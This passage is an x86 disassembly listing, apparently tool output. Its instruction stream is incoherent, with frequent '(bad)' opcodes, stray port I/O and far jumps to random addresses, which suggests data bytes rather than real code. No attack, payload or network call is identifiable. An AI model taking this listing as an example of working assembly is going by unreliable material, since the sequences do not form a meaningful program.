  41ca43:	ror    DWORD PTR [ecx-0xf2673bf],cl
  41ca49:	enter  0x1c4c,0x5c
  41ca4d:	sbb    dl,BYTE PTR [esi]
  41ca4f:	in     al,dx
  41ca50:	pushf  
  41ca51:	lea    esi,[ebx]
  41ca53:	or     al,0x7a
  41ca55:	shl    BYTE PTR [edi+0x7bfdaf09],cl
  41ca5b:	jo     0x41cadc
  41ca5d:	jmp    0x41c9fa
  41ca5f:	sub    DWORD PTR [edi+0x7643c319],ecx
  41ca65:	ins    BYTE PTR es:[edi],dx
  41ca66:	inc    ebp
  41ca67:	mov    eax,ds:0x1d247fdc
  41ca6c:	mov    ebx,0xdc044bad
  41ca71:	xchg   ebp,eax
  41ca72:	mov    esp,0xeaacb052
  41ca77:	xchg   BYTE PTR [ecx-0x48],dl
  41ca7a:	rol    DWORD PTR [esi-0x72eacd52],cl
  41ca80:	shl    ah,1
  41ca82:	mov    DWORD PTR [ebp-0x5a17607a],ecx
  41ca88:	repnz mov bl,0x11
  41ca8b:	fucomp st(3)
  41ca8d:	aas    
  41ca8e:	idiv   ecx
  41ca90:	fld    QWORD PTR [ebx-0x64c994e7]
  41ca96:	test   DWORD PTR [ecx+eax*2],edi
  41ca99:	cwde   
  41ca9a:	adc    edx,ebp
  41ca9c:	ror    DWORD PTR [eax-0xa],0xf9
  41caa0:	jmp    0xc97c9a15
  41caa5:	mov    dl,0x2
  41caa7:	cmp    ebx,esi
  41caa9:	cmp    edi,DWORD PTR [esi+0x788e23a3]
  41caaf:	inc    edi
  41cab0:	cwde   
  41cab1:	xchg   esp,eax
  41cab2:	add    eax,edi
  41cab4:	pop    ebp
  41cab5:	cli    
  41cab6:	aad    0xa2
  41cab8:	xchg   bl,ch
  41caba:	or     ch,BYTE PTR [esi+0x37adb481]
  41cac0:	call   0x123e:0x722bb882
  41cac7:	inc    ebx
  41cac8:	fs xchg ebx,eax
  41caca:	stos   DWORD PTR es:[edi],eax
  41cacb:	pushf  
  41cacc:	xchg   esp,eax
  41cacd:	popf   
  41cace:	test   eax,0xc444ad30
  41cad3:	cdq    
  41cad4:	fld    QWORD PTR [ebp+0x40]
  41cad7:	daa    
  41cad8:	call   0x2a778353
  41cadd:	inc    esp
  41cade:	adc    ch,BYTE PTR [esi]
  41cae0:	push   edi
  41cae1:	adc    eax,0xc455a391
  41cae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cae7:	out    dx,al
  41cae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cae9:	jne    0x41ca91
  41caeb:	pop    edx
  41caec:	mov    cl,0xaa
  41caee:	fcmovnbe st,st(4)
  41caf0:	push   edi
  41caf1:	daa    
  41caf2:	mov    ds:0xf034885d,eax
  41caf7:	or     DWORD PTR [ebx-0x237c35e4],esi
  41cafd:	pop    ss
  41cafe:	jecxz  0x41cab2
  41cb00:	mov    ds:0x2287d7bf,eax
  41cb05:	cmp    DWORD PTR [ebx-0x29],edi
  41cb08:	mov    ch,0x92
  41cb0a:	or     al,0x3c
  41cb0c:	xor    al,0x7e
  41cb0e:	pop    edi
  41cb0f:	scas   al,BYTE PTR es:[edi]
  41cb10:	adc    DWORD PTR [edi],ebp
  41cb12:	ror    BYTE PTR [ecx],1
  41cb14:	xchg   DWORD PTR [edi+ebx*4+0x38],edx
  41cb18:	out    0xcd,al
  41cb1a:	push   eax
  41cb1b:	scas   al,BYTE PTR es:[edi]
  41cb1c:	dec    ecx
  41cb1d:	dec    edx
  41cb1e:	push   0x8e6b5390
  41cb23:	and    DWORD PTR ds:[edx+0x14],esp
  41cb27:	dec    edi
  41cb28:	popf   
  41cb29:	fadd   DWORD PTR [ebx+0x51]
  41cb2c:	aad    0x15
  41cb2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb2f:	jae    0x41cb4b
  41cb31:	mov    al,0x92
  41cb33:	repz push ss
  41cb35:	test   BYTE PTR [esi-0x5d5b9b80],0x5e
  41cb3c:	or     eax,0xaa4271a4
  41cb41:	and    al,0x86
  41cb43:	mov    ds,edx
  41cb45:	add    al,0xbf
  41cb47:	enter  0xf1ef,0x1b
  41cb4b:	mov    cl,0x9c
  41cb4d:	es cdq 
  41cb4f:	imul   edi,DWORD PTR [edi+0x5d6ff4a1],0xfffffff3
  41cb56:	cmc    
  41cb57:	aas    
  41cb58:	push   DWORD PTR [ebp+0x69]
  41cb5b:	pop    edx
  41cb5c:	jnp    0x41cb0a
  41cb5e:	repz xchg dl,al
  41cb61:	xor    eax,0x9d4129df
  41cb66:	stc    
  41cb67:	or     DWORD PTR [esi-0x1062a0cb],ebx
  41cb6d:	ins    BYTE PTR es:[edi],dx
  41cb6e:	loop   0x41cb1b
  41cb70:	or     al,0xf
  41cb72:	xchg   esi,eax
  41cb73:	and    al,0x9f
  41cb75:	lods   eax,DWORD PTR ds:[esi]
  41cb76:	sbb    esi,ebx
  41cb78:	jne    0x41cb8d
  41cb7a:	push   0x12
  41cb7c:	mov    esi,0x4a547f4d
  41cb81:	ja     0x41cc02
  41cb83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb84:	in     eax,dx
  41cb85:	ss addr16 push ebx
  41cb88:	(bad)  
  41cb89:	fwait
  41cb8a:	cmc    
  41cb8b:	jae    0x41cb6c
  41cb8d:	push   ds
  41cb8e:	dec    esi
  41cb8f:	addr16 dec ebp
  41cb91:	imul   esi,DWORD PTR [ebx-0x43e71b45],0x442f525c
  41cb9b:	aaa    
  41cb9c:	jg     0x41cb97
  41cb9e:	mov    esi,0x823e8cf8
  41cba3:	das    
  41cba4:	retf   
  41cba5:	add    BYTE PTR [eax],bh
  41cba7:	mov    ebx,0x7a7ab567
  41cbac:	push   ebp
  41cbad:	stc    
  41cbae:	and    al,0xef
  41cbb0:	dec    edx
  41cbb1:	sub    bl,BYTE PTR [esi-0xb]
  41cbb4:	jae    0x41cbbf
  41cbb6:	outs   dx,DWORD PTR ds:[esi]
  41cbb7:	adc    edi,DWORD PTR [eax]
  41cbb9:	pop    ebx
  41cbba:	sbb    al,BYTE PTR [esi+0x6b]
  41cbbd:	pop    ecx
  41cbbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbbf:	xchg   ecx,eax
  41cbc0:	inc    esi
  41cbc1:	and    cl,BYTE PTR ds:0xd83bff82
  41cbc7:	fstp   TBYTE PTR [edi]
  41cbc9:	test   BYTE PTR [edi+0x2e],dl
  41cbcc:	mov    edx,0x3fd5914d
  41cbd1:	sbb    al,0x61
  41cbd3:	ja     0x41cba4
  41cbd5:	daa    
  41cbd6:	mov    BYTE PTR [ebp+0x7e],0xd7
  41cbda:	std    
  41cbdb:	or     ebp,DWORD PTR [esi]
  41cbdd:	ror    BYTE PTR [edi],1
  41cbdf:	stos   BYTE PTR es:[edi],al
  41cbe0:	ret    
  41cbe1:	mov    edx,DWORD PTR [ebp-0x5a]
  41cbe4:	lods   eax,DWORD PTR ds:[esi]
  41cbe5:	inc    ebp
  41cbe6:	push   0xbe25fa4d
  41cbeb:	fldenv [eax+0x7ac74f1a]
  41cbf1:	or     BYTE PTR [esi-0x35],ch
  41cbf4:	mov    edi,DWORD PTR [ebx+0x814c4ee]
  41cbfa:	add    al,0xb6
  41cbfc:	out    dx,eax
  41cbfd:	call   0x5fce949b
  41cc02:	push   cs
  41cc03:	and    al,0xf0
  41cc05:	inc    eax
  41cc06:	xchg   ebx,eax
  41cc07:	push   0x2156cc7d
  41cc0c:	or     BYTE PTR [ebx+0xfe35acc],dh
  41cc12:	or     eax,0xda43212c
  41cc17:	mov    esi,0x85929d69
  41cc1c:	mov    ebp,0x1b9f687d
  41cc21:	(bad)  
  41cc22:	xchg   edx,eax
  41cc23:	lds    edi,FWORD PTR [eax+0x63]
  41cc26:	jb     0x41cbe9
  41cc28:	push   0x6
  41cc2a:	cmovo  ebx,DWORD PTR [ebx]
  41cc2d:	fisub  DWORD PTR [edi+0x6a]
  41cc30:	push   edx
  41cc31:	js     0x41cc23
  41cc33:	retf   0xd553
  41cc36:	(bad)  
  41cc37:	pop    edx
  41cc38:	dec    ecx
  41cc39:	fsub   DWORD PTR [edi+0x30]
  41cc3c:	mov    ebx,0x2e64131a
  41cc41:	fstp   TBYTE PTR [edi]
  41cc43:	mov    ah,bl
  41cc45:	or     eax,0xd294ac39
  41cc4a:	jbe    0x41cc9e
  41cc4c:	ins    BYTE PTR es:[edi],dx
  41cc4d:	mov    ds:0x8d9774e8,eax
  41cc52:	test   BYTE PTR [bp+di-0x77],0xcf
  41cc57:	inc    ebp
  41cc58:	adc    eax,0x601a70f3
  41cc5d:	inc    esp
  41cc5e:	outs   dx,DWORD PTR ds:[esi]
  41cc5f:	div    DWORD PTR ss:[edx+0x7ce4d162]
  41cc66:	arpl   WORD PTR [eax+0x54f35043],si
  41cc6c:	cmp    BYTE PTR [edx+0x50757871],bh
  41cc72:	inc    edi
  41cc73:	shl    BYTE PTR [ebp-0x42a99c6f],1
  41cc79:	xchg   BYTE PTR [ecx],ch
  41cc7b:	cs xchg esp,eax
  41cc7d:	bound  esp,QWORD PTR [ecx]
  41cc7f:	sbb    DWORD PTR [ecx+0x126985a9],0x6b
  41cc86:	test   BYTE PTR [edi+ebp*1],al
  41cc89:	xor    ebx,DWORD PTR [ebp-0x48860c09]
  41cc8f:	inc    edx
  41cc90:	lods   al,BYTE PTR ds:[esi]
  41cc91:	sub    eax,0xd120a4c9
  41cc96:	jnp    0x41cc23
  41cc98:	call   0x3d0b:0xa93d8638
  41cc9f:	rcl    BYTE PTR [esi-0x5b],cl
  41cca2:	or     eax,DWORD PTR [edi]
  41cca4:	xor    edx,DWORD PTR [ecx-0x3b]
  41cca7:	mov    BYTE PTR [ebp-0x5d11194a],bh
  41ccad:	mov    bl,0xe1
  41ccaf:	sbb    esi,DWORD PTR [ecx]
  41ccb1:	push   edx
  41ccb2:	sbb    eax,0x9efde105
  41ccb7:	jmp    0x5aea895
  41ccbc:	popf   
  41ccbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccbe:	adc    DWORD PTR [ecx-0x1ee1e287],ebp
  41ccc4:	pop    ds
  41ccc5:	add    al,0xb
  41ccc7:	add    bl,dh
  41ccc9:	inc    edi
  41ccca:	scas   al,BYTE PTR es:[edi]
  41cccb:	pop    ecx
  41cccc:	inc    ebx
  41cccd:	xor    BYTE PTR [esi],dh
  41cccf:	push   cs
  41ccd0:	cmp    esi,DWORD PTR [ecx+0x71]
  41ccd3:	sbb    eax,0xdf8a43c0
  41ccd8:	xlat   BYTE PTR ds:[ebx]
  41ccd9:	in     eax,dx
  41ccda:	and    eax,0xcb587b2a
  41ccdf:	mov    DWORD PTR [esi+edx*8-0x27],edi
  41cce3:	scas   al,BYTE PTR es:[edi]
  41cce4:	xlat   BYTE PTR ds:[ebx]
  41cce5:	icebp  
  41cce6:	inc    esi
  41cce7:	xor    ebp,esp
  41cce9:	pop    edi
  41ccea:	and    eax,0x6c688cf0
  41ccef:	imul   edx,DWORD PTR [eax],0xffffff84
  41ccf2:	mov    al,0xa5
  41ccf4:	(bad)  
  41ccf5:	in     eax,dx
  41ccf6:	jp     0x41cc9d
  41ccf8:	mov    ch,0x29
  41ccfa:	mov    ds:0x7e5cc0b,eax
  41ccff:	and    BYTE PTR [esi],bl
  41cd01:	lods   eax,DWORD PTR ds:[esi]
  41cd02:	and    ebp,DWORD PTR [ecx+0x59]
  41cd05:	push   ebx
  41cd06:	xor    eax,0x94bdbbf5
  41cd0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd0c:	adc    BYTE PTR [ebx],ah
  41cd0e:	and    DWORD PTR [ecx-0x7f],edx
  41cd11:	lods   al,BYTE PTR ds:[esi]
  41cd12:	lods   al,BYTE PTR ds:[esi]
  41cd13:	enter  0xe362,0xc3
  41cd17:	sbb    al,0x7
  41cd19:	test   eax,0x7e14f602
  41cd1e:	and    BYTE PTR [edi],ch
  41cd20:	sahf   
  41cd21:	mov    edi,0xaf0c1ced
  41cd26:	cmp    bl,al
  41cd28:	or     ecx,DWORD PTR [ebp-0x4d40b596]
  41cd2e:	je     0x41cd51
  41cd30:	adc    DWORD PTR [edx-0x15],ebp
  41cd33:	retf   
  41cd34:	mov    eax,0x50829d1c
  41cd39:	sti    
  41cd3a:	mov    ah,0xb3
  41cd3c:	mov    DWORD PTR [eax],esp
  41cd3e:	int    0xe4
  41cd40:	call   0xe7251fe8
  41cd45:	icebp  
  41cd46:	or     al,0x6a
  41cd48:	xchg   esp,eax
  41cd49:	cmp    esp,DWORD PTR [edi-0x15e1f07f]
  41cd4f:	or     al,0x9c
  41cd51:	rcl    BYTE PTR [esi+0x2dcad7f8],1
  41cd57:	jmp    0x41cdb1
  41cd59:	scas   al,BYTE PTR es:[edi]
  41cd5a:	add    dh,BYTE PTR [edi+0x3f171fc1]
  41cd60:	icebp  
  41cd61:	sub    BYTE PTR [edi+0x558b909c],bh
  41cd67:	sbb    eax,0x49a1ce09
  41cd6c:	outs   dx,DWORD PTR gs:[esi]
  41cd6e:	cmp    DWORD PTR ds:0x210b8159,ebx
  41cd74:	push   0x31c83167
  41cd79:	icebp  
  41cd7a:	xor    cl,BYTE PTR [esi]
  41cd7c:	xchg   BYTE PTR [ecx+edx*8+0x1c],ch
  41cd80:	call   0xd033967b
  41cd85:	jg     0x41cd15
  41cd87:	pushf  
  41cd88:	popa   
  41cd89:	mov    ebx,0xd5f0d750
  41cd8e:	(bad)  
  41cd8f:	je     0x41cd7d
  41cd91:	xor    ebp,DWORD PTR [esi+0x19]
  41cd94:	sti    
  41cd95:	push   0x7394d5f1
  41cd9a:	addr16 push ds
  41cd9c:	mov    DWORD PTR [ecx-0x147973aa],esp
  41cda2:	fbld   TBYTE PTR [eax]
  41cda4:	aad    0x40
  41cda6:	sbb    DWORD PTR [eax],esp
  41cda8:	fcomp  QWORD PTR fs:[ebp+0x5ce4b931]
  41cdaf:	sub    eax,0x381bb76e
  41cdb4:	popf   
  41cdb5:	cld    
  41cdb6:	adc    DWORD PTR [esi+0x230678db],ecx
  41cdbc:	test   DWORD PTR [eax+0x5dbabbe],esp
  41cdc2:	jnp    0x41ce41
  41cdc4:	fsubr  QWORD PTR [ebp-0x7a382924]
  41cdca:	iret   
  41cdcb:	out    0x90,eax
  41cdcd:	fisubr DWORD PTR [eax+edx*1+0x74fe7d18]
  41cdd4:	(bad)  
  41cdd5:	sbb    al,0xf7
  41cdd7:	sub    DWORD PTR [ebx-0x1f],eax
  41cdda:	dec    edi
  41cddb:	jmp    0x1efd:0x426382d
  41cde2:	or     al,0x94
  41cde4:	or     al,0x1
  41cde6:	mov    edi,DWORD PTR [edx+0x35]
  41cde9:	scas   eax,DWORD PTR es:[edi]
  41cdea:	pop    edx
  41cdeb:	mov    ch,ah
  41cded:	aas    
  41cdee:	nop
  41cdef:	add    dh,BYTE PTR [ebp+0x45]
  41cdf2:	mov    dh,BYTE PTR cs:[ebp+esi*8+0x5c]
  41cdf7:	ja     0x41cdb7
  41cdf9:	lock stc 
  41cdfb:	cmp    eax,0x80734616
  41ce00:	clc    
  41ce01:	push   ebp
  41ce02:	fidiv  WORD PTR [esi+esi*8+0x32c96b37]
  41ce09:	pop    esi
  41ce0a:	mov    eax,0xe7bf4d43
  41ce0f:	enter  0x8c88,0x15
  41ce13:	test   BYTE PTR [ebp+0x1e7d8e2e],bh
  41ce19:	lds    edx,FWORD PTR [edx]
  41ce1b:	(bad)  
  41ce1c:	mov    cl,0xa0
  41ce1e:	mov    esp,0x31fd8e00
  41ce23:	ins    DWORD PTR es:[edi],dx
  41ce24:	in     al,dx
  41ce25:	jae    0x41ce00
  41ce27:	pop    esi
  41ce28:	test   BYTE PTR [esp-0x44],ch
  41ce2c:	dec    edx
  41ce2d:	sub    eax,esi
  41ce2f:	push   edi
  41ce30:	xor    DWORD PTR ds:0xcb2554b7,esp
  41ce36:	push   esp
  41ce37:	je     0x41ce2b
  41ce39:	es pusha 
  41ce3b:	in     al,0xb3
  41ce3d:	mov    edi,0x6d8cd9f1
  41ce42:	inc    edi
  41ce43:	fldln2 
  41ce45:	mov    BYTE PTR [ecx],bl
  41ce47:	into   
  41ce48:	xlat   BYTE PTR ds:[ebx]
  41ce49:	mov    ds:0x5f893a73,eax
  41ce4e:	cmc    
  41ce4f:	cmp    cl,BYTE PTR [ebp-0x25]
  41ce52:	and    bh,BYTE PTR [esi]
  41ce54:	and    al,0x66
  41ce56:	mov    esi,0xce686043
  41ce5b:	xor    eax,0xd79069d8
  41ce60:	shl    ecx,0x40
  41ce63:	pop    ebp
  41ce64:	mov    BYTE PTR [edi-0x6e],dl
  41ce67:	in     al,0x98
  41ce69:	imul   esp,ebp,0xffffff90
  41ce6c:	adc    BYTE PTR [eax],dl
  41ce6e:	mov    ch,0x5a
  41ce70:	jecxz  0x41ce3a
  41ce72:	mov    esp,gs
  41ce74:	mov    eax,ds:0x51c39fb7
  41ce79:	lods   eax,DWORD PTR ds:[esi]
  41ce7a:	inc    ebx
  41ce7b:	inc    ecx
  41ce7c:	push   0xffffff87
  41ce7e:	add    eax,0xdfdab45d
  41ce83:	mov    dh,0xba
  41ce85:	cmc    
  41ce86:	xor    DWORD PTR [ecx],esi
  41ce88:	pop    esp
  41ce89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce8a:	push   es
  41ce8b:	and    ebx,esi
  41ce8d:	imul   ecx,edx,0x2f118b64
  41ce93:	push   esp
  41ce94:	cli    
  41ce95:	fnstsw WORD PTR [ebp+0x423482bb]
  41ce9b:	push   esp
  41ce9c:	mov    ebx,0x740d15a3
  41cea1:	setl   BYTE PTR [eax]
  41cea4:	mov    eax,0x39bcfd0a
  41cea9:	(bad)  
  41ceaa:	pushf  
  41ceab:	fnsave [ebp-0x3]
  41ceae:	arpl   WORD PTR [edi-0x2b3d5970],sp
  41ceb4:	cli    
  41ceb5:	sbb    al,0x66
  41ceb7:	add    BYTE PTR [edi],dl
  41ceb9:	ror    DWORD PTR [ebp+0x790f53d3],1
  41cebf:	scas   eax,DWORD PTR es:[edi]
  41cec0:	mov    al,0x69
  41cec2:	sub    eax,0x8f165b2
  41cec7:	mov    ds:0xebc674e7,al
  41cecc:	gs mov cl,0x32
  41cecf:	mov    ch,cl
  41ced1:	popf   
  41ced2:	ret    0x62f5
  41ced5:	dec    ebp
  41ced6:	jb     0x41cefd
  41ced8:	mov    ah,0xbf
  41ceda:	in     eax,0x3d
  41cedc:	les    esp,FWORD PTR [edi]
  41cede:	fsubr  DWORD PTR [esi+0x379407c5]
  41cee4:	arpl   WORD PTR [ebp-0x621cab49],cx
  41ceea:	cmp    DWORD PTR [esi+0x12],esp
  41ceed:	dec    BYTE PTR [esi+eax*4-0x6536148b]
  41cef4:	or     dl,ch
  41cef6:	cmp    BYTE PTR [ebp+0x1f],ah
  41cef9:	mov    dl,0x78
  41cefb:	jns    0x41cf14
  41cefd:	inc    ecx
  41cefe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceff:	add    eax,0xa006ea58
  41cf04:	and    ecx,DWORD PTR [edi+0x40]
  41cf07:	or     DWORD PTR [ecx+ebx*8-0x60f5ff14],esi
  41cf0e:	add    BYTE PTR [ecx+0x24d3f5fd],bl
  41cf14:	mov    dh,0xfb
  41cf16:	js     0x41cec9
  41cf18:	and    ah,0xbd
  41cf1b:	cmp    BYTE PTR [ecx],dh
  41cf1d:	sub    DWORD PTR [ebx+ebx*1-0x5c],eax
  41cf21:	outs   dx,BYTE PTR ds:[esi]
  41cf22:	fnsave [ecx]
  41cf24:	add    BYTE PTR [eax-0x1b],dl
  41cf27:	push   esp
  41cf28:	adc    esp,DWORD PTR [edi+ecx*4]
  41cf2b:	js     0x41cebe
  41cf2d:	and    al,0x45
  41cf2f:	adc    DWORD PTR [ebx+0x618ff073],ebx
  41cf35:	jo     0x41cec7
  41cf37:	adc    eax,0x987466a5
  41cf3c:	fcomp  DWORD PTR [edx+0x66]
  41cf3f:	inc    esp
  41cf40:	push   eax
  41cf41:	and    DWORD PTR [eax-0x19],esp
  41cf44:	jbe    0x41ced3
  41cf46:	add    al,0x7f
  41cf48:	fdivr  st,st(0)
  41cf4a:	xor    esp,esp
  41cf4c:	mov    eax,ds:0x61e1809c
  41cf51:	in     al,dx
  41cf52:	loope  0x41cef9
  41cf54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf55:	cld    
  41cf56:	xchg   esp,eax
  41cf57:	mov    ch,0x3e
  41cf59:	ret    0x1e1b
  41cf5c:	pop    edi
  41cf5d:	jl     0x41cf5d
  41cf5f:	push   esp
  41cf60:	sbb    esp,DWORD PTR [edi+eiz*1+0x64]
  41cf64:	(bad)  
  41cf65:	not    BYTE PTR [ecx-0x541145d4]
  41cf6b:	or     al,0x1b
  41cf6d:	xchg   BYTE PTR ss:[ecx],dh
  41cf70:	adc    eax,0x8ddc4603
  41cf75:	jns    0x41cf6a
  41cf77:	inc    ebp
  41cf78:	cld    
  41cf79:	add    al,0x63
  41cf7b:	fidivr WORD PTR [ebx-0x15]
  41cf7e:	add    eax,0xb164af11
  41cf83:	jno    0x41cfcc
  41cf85:	pop    eax
  41cf86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf87:	jp     0x41cfe8
  41cf89:	and    al,ah
  41cf8b:	out    dx,eax
  41cf8c:	or     al,0xdb
  41cf8e:	push   ecx
  41cf8f:	fisubr DWORD PTR [esi+0x76ded99c]
  41cf95:	enter  0x922c,0x6e
  41cf99:	push   ecx
  41cf9a:	adc    DWORD PTR [esi-0x40],0xffffffce
  41cf9e:	push   ecx
  41cf9f:	jg     0x41cf92
  41cfa1:	cmp    edi,edi
  41cfa3:	mov    dl,0xdf
  41cfa5:	sub    ebp,esi
  41cfa7:	dec    ebp
  41cfa8:	(bad)  
  41cfa9:	imul   ebx,DWORD PTR [ebp*8-0x11b596df],0x6
  41cfb1:	cmp    cl,0x70
  41cfb4:	jp     0x41cfd3
  41cfb6:	cmp    eax,DWORD PTR [eax+0x73]
  41cfb9:	push   es
  41cfba:	or     edx,DWORD PTR [edx-0x5d]
  41cfbd:	shl    DWORD PTR [eax],1
  41cfbf:	pop    ebp
  41cfc0:	xor    edx,DWORD PTR [edi-0x27]
  41cfc3:	xchg   ebp,eax
  41cfc4:	jecxz  0x41cfeb
  41cfc6:	mov    al,ds:0x29bd2342
  41cfcb:	xchg   ecx,eax
  41cfcc:	test   DWORD PTR [ecx-0x3cacc079],0x32776c0b
  41cfd6:	popf   
  41cfd7:	lods   al,BYTE PTR ds:[esi]
  41cfd8:	mov    al,0x59
  41cfda:	add    dl,ah
  41cfdc:	rcr    BYTE PTR [edi+0x70],1
  41cfdf:	rcl    DWORD PTR [edx+0x3e0b4f35],0x77
  41cfe6:	aam    0x70
  41cfe8:	xor    BYTE PTR [eax],ah
  41cfea:	inc    esp
  41cfeb:	and    eax,0x9af6ce01
  41cff0:	js     0x41d06f
  41cff2:	or     BYTE PTR [esi],bl
  41cff4:	xor    DWORD PTR [edx-0x48a0c91b],edi
  41cffa:	cmp    eax,0xa707d33f
  41cfff:	out    0x20,eax
  41d001:	push   cs
  41d002:	in     eax,0xb9
  41d004:	mov    ?,WORD PTR [eax-0x4f]
  41d007:	xor    al,0xa5
  41d009:	push   0xffffff9c
  41d00b:	adc    DWORD PTR [ebx+0x3d],ecx
  41d00e:	adc    DWORD PTR [edi+0x72d15151],esp
  41d014:	adc    dl,BYTE PTR [ecx+0x330b7e91]
  41d01a:	iret   
  41d01b:	and    ecx,DWORD PTR [esi]
  41d01d:	dec    esi
  41d01e:	pop    edx
  41d01f:	inc    esi
  41d020:	fldenv [ecx+ecx*8+0x22]
  41d024:	pushf  
  41d025:	cwde   
  41d026:	adc    eax,0x317b927e
  41d02b:	repz jge 0x41cfee
  41d02e:	or     eax,0x4c82030
  41d033:	adc    BYTE PTR [ebx],bl
  41d035:	ds or  ax,0x504a
  41d03a:	mov    al,ds:0xaeffcaa6
  41d03f:	and    BYTE PTR [eax],0xb2
  41d042:	ror    BYTE PTR [edi-0x4d],0x23
  41d046:	dec    edi
  41d047:	in     eax,dx
  41d048:	and    al,0x9
  41d04a:	or     DWORD PTR [esi-0x57],esi
  41d04d:	jmp    0x41d035
  41d04f:	inc    ebx
  41d050:	test   eax,0xaed8790c
  41d055:	sub    dl,BYTE PTR [edx]
  41d057:	stos   BYTE PTR es:[edi],al
  41d058:	cmp    DWORD PTR ds:0x16ec1388,edx
  41d05e:	retf   
  41d05f:	ja     0x41d0dd
  41d061:	stos   DWORD PTR es:[edi],eax
  41d062:	nop
  41d063:	mov    ds:0xb080f325,eax
  41d068:	jmp    0x2b08:0xf02f4862
  41d06f:	cmp    eax,0x605eca5f
  41d074:	cmp    edx,eax
  41d076:	clc    
  41d077:	outs   dx,DWORD PTR ds:[esi]
  41d078:	in     al,0xbd
  41d07a:	js     0x41d0a0
  41d07c:	inc    ebp
  41d07d:	hlt    
  41d07e:	cmp    esp,DWORD PTR [edx+0x45a502ee]
  41d084:	(bad)  
  41d085:	stos   DWORD PTR es:[edi],eax
  41d086:	adc    DWORD PTR ds:0xc2926d19,edx
  41d08c:	ficomp WORD PTR [eax-0x3f1a3d8e]
  41d092:	scas   eax,DWORD PTR es:[edi]
  41d093:	je     0x41d0ae
  41d095:	jmp    0xfa52:0x992d941d
  41d09c:	clc    
  41d09d:	inc    esi
  41d09e:	add    ecx,DWORD PTR [esi]
  41d0a0:	pop    edi
  41d0a1:	xchg   esp,eax
  41d0a2:	mov    dh,0x73
  41d0a4:	fisttp QWORD PTR ds:0xc99ffce9
  41d0aa:	xchg   ebx,eax
  41d0ab:	push   eax
  41d0ac:	fcom   QWORD PTR [ebx-0x57]
  41d0af:	aaa    
  41d0b0:	cs dec edi
  41d0b2:	adc    DWORD PTR [eax],edx
  41d0b4:	and    eax,0x471e593
  41d0b9:	xor    ch,bl
  41d0bb:	inc    ebp
  41d0bc:	nop
  41d0bd:	inc    ebp
  41d0be:	xchg   DWORD PTR [edx],ebx
  41d0c0:	lods   al,BYTE PTR ds:[esi]
  41d0c1:	and    BYTE PTR [ebp+edi*4+0x49a69b3f],ah
  41d0c8:	sub    eax,0x24305506
  41d0cd:	fdivr  DWORD PTR [ecx]
  41d0cf:	mov    WORD PTR [edi-0x4a15737b],fs
  41d0d5:	ja     0x41d13d
  41d0d7:	or     eax,0x13fe74ab
  41d0dc:	push   ecx
  41d0dd:	rol    DWORD PTR [ecx-0x20f0c563],cl
  41d0e3:	mov    eax,ds:0x42e6fe64
  41d0e8:	fimul  DWORD PTR [edi]
  41d0ea:	jp     0x41d0d0
  41d0ec:	arpl   WORD PTR [edi+edi*8+0x6f9284f7],di
  41d0f3:	inc    edi
  41d0f4:	aaa    
  41d0f5:	out    dx,eax
  41d0f6:	dec    ebx
  41d0f7:	inc    esi
  41d0f8:	jae    0x41d0c1
  41d0fa:	jae    0x41d0ca
  41d0fc:	xor    eax,esi
  41d0fe:	adc    eax,0xa875fcd0
  41d103:	adc    ch,BYTE PTR [ebx+0x60]
  41d106:	test   eax,0x83daf169
  41d10b:	adc    DWORD PTR [eax],edx
  41d10d:	sbb    bl,BYTE PTR [esi+0x32]
  41d110:	sti    
  41d111:	aas    
  41d112:	push   ds
  41d113:	lods   al,BYTE PTR ds:[esi]
  41d114:	mov    ah,0x3d
  41d116:	leave  
  41d117:	sbb    eax,0x470f7831
  41d11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d11d:	mov    bl,0x46
  41d11f:	outs   dx,BYTE PTR ds:[esi]
  41d120:	stc    
  41d121:	aad    0xc0
  41d123:	cwde   
  41d124:	lds    esi,FWORD PTR [esi+0x5e2fcb02]
  41d12a:	xchg   BYTE PTR [esi*4-0x3756c455],dl
  41d131:	fwait
  41d132:	(bad)  
  41d133:	or     al,0x51
  41d135:	and    ecx,ebx
  41d137:	and    BYTE PTR [ebx],bh
  41d139:	jns    0x41d10c
  41d13b:	pushf  
  41d13c:	jae    0x41d0ca
  41d13e:	or     DWORD PTR ds:0x43a6e51b,esi
  41d144:	out    0xa7,al
  41d146:	inc    edi
  41d147:	cmp    al,0x92
  41d149:	pop    esp
  41d14a:	push   ecx
  41d14b:	cmp    eax,0xd93d015a
  41d150:	mov    al,0x62
  41d152:	ror    DWORD PTR [ecx+ebp*1+0x634c3b3],0xc
  41d15a:	pop    ebx
  41d15b:	jo     0x41d169
  41d15d:	push   edx
  41d15e:	mul    BYTE PTR [edi+0x5cb6f3d6]
  41d164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d165:	rol    BYTE PTR [esp+ebp*1-0x2f],0xbd
  41d16a:	test   al,0x6f
  41d16c:	push   ecx
  41d16d:	stos   DWORD PTR es:[edi],eax
  41d16e:	adc    DWORD PTR [esi],edi
  41d170:	ret    
  41d171:	mov    ds:0x716a4c5e,eax
  41d176:	adc    BYTE PTR [ecx+0x5],0xc
  41d17a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d17b:	ss shr bh,0x8f
  41d17f:	adc    cl,cl
  41d181:	sbb    edi,ebp
  41d183:	addr16 sbb eax,0x512b3240
  41d189:	hlt    
  41d18a:	(bad)  
  41d18b:	ret    
  41d18c:	fmulp  st(7),st
  41d18e:	cdq    
  41d18f:	xchg   ecx,eax
  41d190:	mov    esp,0x497d5e1c
  41d195:	jge    0x41d136
  41d197:	xchg   edx,eax
  41d198:	add    dl,ah
  41d19a:	mov    fs,WORD PTR [edx-0x2a]
  41d19d:	mov    al,ds:0x69f66a60
  41d1a2:	gs xchg ebx,eax
  41d1a4:	inc    ebx
